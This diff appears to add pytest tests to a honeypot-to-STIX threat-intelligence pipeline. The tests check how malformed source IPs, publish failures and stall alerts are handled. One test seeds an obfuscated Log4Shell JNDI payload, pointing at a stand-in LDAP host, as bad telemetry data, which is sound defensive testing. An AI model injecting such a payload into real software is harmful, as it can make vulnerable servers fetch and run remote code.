@@ -383,3 +383,52 @@ def test_a_read_failure_leaves_the_cursor_untouched(cfg, state_db, tmp_path):
     nf.run_cycle(cfg, state_db, str(tmp_path / "gone.db"),
                  lambda: STIXBuilder(cfg), _Pub())
     assert state_db.get(nf.SWEEP_CURSOR_KEY) == "45.9.5.5"
+
+
+def test_unparseable_src_ip_is_counted_not_silently_dropped(cfg, state_db, tmp_path):
+    """CORE's telemetry really does contain non-addresses: H0neytr4p stores raw
+    exploit payloads (obfuscated Log4Shell JNDI strings) in src_ip. Skipping
+    them is right; skipping them invisibly is how loss goes unnoticed."""
+    from datetime import datetime, timezone
+    from tpot2cti.stix.builder import STIXBuilder
+    now = datetime.now(timezone.utc).isoformat()
+    db = str(tmp_path / "core.db")
+    payload = "${${lower:j}ndi:ldap://x/a}"
+    _seed_core_db(db, [(payload, p, "s1", 1, 1, 0, 0, 0, 0, now, now, None)
+                       for p in ("Cowrie", "Dionaea", "ConPot")])
+    pub = _Pub()
+    s = nf.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), pub)
+    assert s["malformed"] == 1
+    assert s["fleet_scan"] == 0, "counted a non-address as a labelled IP"
+    assert pub.objects is None, "published an object for a non-address"
+
+
+def test_a_deterministically_bad_page_is_named_not_silently_stalled(cfg, state_db, tmp_path, caplog):
+    """The sweep must not skip a page that fails to publish — that is walking
+    past lost data. But an unskippable page stalls coverage, and a stall that
+    looks like 'still working' is indistinguishable from progress. It gets
+    called out by name."""
+    import logging
+    from datetime import datetime, timezone
+    from tpot2cti.stix.builder import STIXBuilder
+    now = datetime.now(timezone.utc).isoformat()
+    db = str(tmp_path / "core.db")
+    _seed_core_db(db, _scanners(5, now))
+    with caplog.at_level(logging.ERROR):
+        for _ in range(nf.STUCK_PAGE_ALERT):
+            nf.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(ok=False))
+    assert any("SWEEP WEDGED" in r.message for r in caplog.records), \
+        "a wedged sweep produced no operator-visible signal"
+    assert (state_db.get(nf.SWEEP_CURSOR_KEY) or "") == "", "advanced past a failed page"
+
+
+def test_the_stuck_counter_resets_once_publishing_recovers(cfg, state_db, tmp_path):
+    from datetime import datetime, timezone
+    from tpot2cti.stix.builder import STIXBuilder
+    now = datetime.now(timezone.utc).isoformat()
+    db = str(tmp_path / "core.db")
+    _seed_core_db(db, _scanners(5, now))
+    nf.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(ok=False))
+    assert int(state_db.get(nf.STUCK_COUNT_KEY)) == 1
+    nf.run_cycle(cfg, state_db, db, lambda: STIXBuilder(cfg), _Pub(ok=True))
+    assert int(state_db.get(nf.STUCK_COUNT_KEY)) == 0
